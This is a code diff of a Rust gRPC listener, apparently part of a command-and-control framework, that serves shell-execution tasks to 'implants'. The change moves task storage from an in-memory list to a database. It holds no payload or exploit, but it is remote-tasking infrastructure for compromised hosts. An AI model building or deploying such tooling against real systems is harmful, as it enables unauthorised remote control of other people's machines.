@@ -1,28 +1,24 @@
-mod implantpb {
-    tonic::include_proto!("implantpb");
-}
-
-use crate::share::Error;
-use implantpb::{ExecBody, Empty, TaskRequest, TaskResponse, TaskResult};
+use crate::share::{Error, implantpb};
+use crate::server::db::Db;
+use implantpb::{ExecBody, Empty, TaskRequest, TaskResponse, TaskResult, TaskType};
 use implantpb::implant_rpc_server::{ImplantRpc, ImplantRpcServer};
 use implantpb::task_response::TaskPayload;
 use std::net::SocketAddr;
-use std::sync::{Mutex, Arc};
+use std::sync::Arc;
 use tonic::transport::{Identity, Server, ServerTlsConfig};
 use tonic::{Request, Response, Status};
 
 // Listen for implants
 pub struct Listener {
     addr: SocketAddr,
-    pub tasks: Arc<Mutex<Vec<String>>>
+    pub db: Arc<Db>
 }
 
 impl Listener {
-    pub fn new(addr: SocketAddr) -> Listener {
-        let tasks = Arc::new(Mutex::new(Vec::new()));
+    pub fn new(addr: SocketAddr, db: Arc<Db>) -> Listener {
         Listener{
             addr,
-            tasks
+            db
         }
     }
 
@@ -35,7 +31,7 @@ impl Listener {
             .map_err(|e| Error::ListenerStartErr(e.to_string()))?;
         let identity =  Identity::from_pem(cert, key);
 
-        let service = ImplantService::new(Arc::clone(&self.tasks));
+        let service = ImplantService::new(Arc::clone(&self.db));
         let tls_config = ServerTlsConfig::new().identity(identity);
         let svc = ImplantRpcServer::new(service);
 
@@ -56,12 +52,12 @@ impl Listener {
 // Define gRPC methods
 struct ImplantService {
     // A thread-save vector of tasks
-    tasks: Arc<Mutex<Vec<String>>>
+    db: Arc<Db>
 }
 
 impl ImplantService {
-    fn new(tasks: Arc<Mutex<Vec<String>>>) -> ImplantService {
-        ImplantService { tasks }
+    fn new(db: Arc<Db>) -> ImplantService {
+        ImplantService { db }
     }
 }
 
@@ -71,19 +67,27 @@ impl ImplantRpc for ImplantService {
 
     // Let an implant retrieve a task
     async fn get_task(&self, _: Request<TaskRequest>) -> Result<Response<TaskResponse>, Status> {
-        let task_payload = match self.tasks.lock() {
-            Ok(t) => t,
-            Err(_) => return Err(Status::unavailable("Could not lock tasks mutex"))
-        }
-        .get(0)
-        .cloned()
-        .map(|cmd| TaskPayload::ExecTask(ExecBody {
-            cmd
-        }));
+        // let task_payload = match self.tasks.lock() {
+        //     Ok(t) => t,
+        //     Err(_) => return Err(Status::unavailable("Could not lock tasks mutex"))
+        // }
+        // .get(0)
+        // .cloned()
+        let task_payload = self.db.get_task().await
+            .map_err(|x| Status::unavailable(format!("{:?}", x)))?
+            .map(|model| {
+                model.payload
+                    .map(|s| TaskPayload::ExecTask(ExecBody { cmd: s }))
+            })
+            .flatten();
+
+        // .map(|cmd| TaskPayload::ExecTask(ExecBody {
+            // cmd
+        // }));
 
         let response = TaskResponse {
             task_id: 1,
-            task_type: 2,
+            task_type: TaskType::ExecTask as i32,
             task_payload
         };
 
